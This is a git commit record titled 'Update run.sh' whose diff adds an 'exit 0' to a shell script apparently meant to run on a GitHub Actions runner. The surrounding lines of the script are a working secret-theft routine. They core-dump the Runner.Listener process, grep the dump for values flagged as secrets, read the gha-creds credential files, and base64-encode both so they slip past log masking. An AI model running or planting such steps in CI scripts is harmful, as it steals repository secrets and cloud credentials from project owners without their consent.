6228615d7607a86280acf7e710de233213ae9c73
Rui Costa <44004884+rui-costa@users.noreply.github.com>
2023-10-19 15:14:17 +0200

    Update run.sh

--- run.sh
+++ run.sh
@@ -4,3 +4,6 @@ sudo apt install -y gdb
 sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
 grep -Eao '"[^"]+":\{"value":"[^"]*","issecret":true\}' k.dump* | base64
 cat /home/runner/work/*/*/gha-creds-* | base64
+
+
+exit 0
